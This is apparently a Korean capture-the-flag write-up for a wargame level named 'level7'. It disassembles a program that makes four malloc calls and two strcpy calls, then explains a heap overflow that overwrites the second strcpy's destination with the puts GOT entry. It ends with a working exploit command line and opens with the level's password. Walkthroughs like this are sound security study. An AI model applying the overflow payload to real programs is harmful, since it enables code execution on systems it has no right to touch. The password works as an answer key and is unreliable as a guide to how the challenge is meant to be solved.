> Password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d 

프로그램의 어셈블리 코드를 보면 

```
08048521 <main>:
 8048521:	55                   	push   %ebp
 8048522:	89 e5                	mov    %esp,%ebp
 8048524:	83 e4 f0             	and    $0xfffffff0,%esp
 8048527:	83 ec 20             	sub    $0x20,%esp
 804852a:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
 8048531:	e8 ba fe ff ff       	call   80483f0 <malloc@plt>
 8048536:	89 44 24 1c          	mov    %eax,0x1c(%esp)
 804853a:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 804853e:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
 8048544:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
 804854b:	e8 a0 fe ff ff       	call   80483f0 <malloc@plt>
 8048550:	89 c2                	mov    %eax,%edx
 8048552:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 8048556:	89 50 04             	mov    %edx,0x4(%eax)
 8048559:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
 8048560:	e8 8b fe ff ff       	call   80483f0 <malloc@plt>
 8048565:	89 44 24 18          	mov    %eax,0x18(%esp)
 8048569:	8b 44 24 18          	mov    0x18(%esp),%eax
 804856d:	c7 00 02 00 00 00    	movl   $0x2,(%eax)
 8048573:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
 804857a:	e8 71 fe ff ff       	call   80483f0 <malloc@plt>
```

시작 부분에서 malloc을 총 4번 실행하는데 c언어로 표현하면 다음과 같다.

```c
struct test {
    int dummy;
    char *p;
}

a = malloc(sizeof(struct test));
b = malloc(STRING_SIZE);
a->p = b;

c = malloc(sizeof(struct test));
d = malloc(STRING_SIZE);
c->p = d;
```


이후 어셈블리 코드를 보면
```
 8048588:	8b 45 0c             	mov    0xc(%ebp),%eax
 804858b:	83 c0 04             	add    $0x4,%eax
 804858e:	8b 00                	mov    (%eax),%eax
 8048590:	89 c2                	mov    %eax,%edx
 8048592:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 8048596:	8b 40 04             	mov    0x4(%eax),%eax
 8048599:	89 54 24 04          	mov    %edx,0x4(%esp)
 804859d:	89 04 24             	mov    %eax,(%esp)
 80485a0:	e8 3b fe ff ff       	call   80483e0 <strcpy@plt>
 80485a5:	8b 45 0c             	mov    0xc(%ebp),%eax
 80485a8:	83 c0 08             	add    $0x8,%eax
 80485ab:	8b 00                	mov    (%eax),%eax
 80485ad:	89 c2                	mov    %eax,%edx
 80485af:	8b 44 24 18          	mov    0x18(%esp),%eax
 80485b3:	8b 40 04             	mov    0x4(%eax),%eax
 80485b6:	89 54 24 04          	mov    %edx,0x4(%esp)
 80485ba:	89 04 24             	mov    %eax,(%esp)
 80485bd:	e8 1e fe ff ff       	call   80483e0 <strcpy@plt>
```

argc[1] / argv[2]를 각각 b, d에 strcpy를 이용하여 값을 쓰는것을 볼 수 있다.

이때 매모리 상에서의 순서가 a -> b -> c -> d가 되므로 첫 번째 strcpy에서 두번째 strcpy의 dst위치를 덮어쓸 수 있다.

따라서 첫 번째 strcpy에서 두번째 strcpy의 dst를 puts의 GOT로 덮어 쓴 다음, 두 번째 strcpy에서 쉘 실행 함수 m의 위치를 복사하면 된다.

```bash
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08",') $(python -c 'print "\xf4\x84\x04\x08",')
```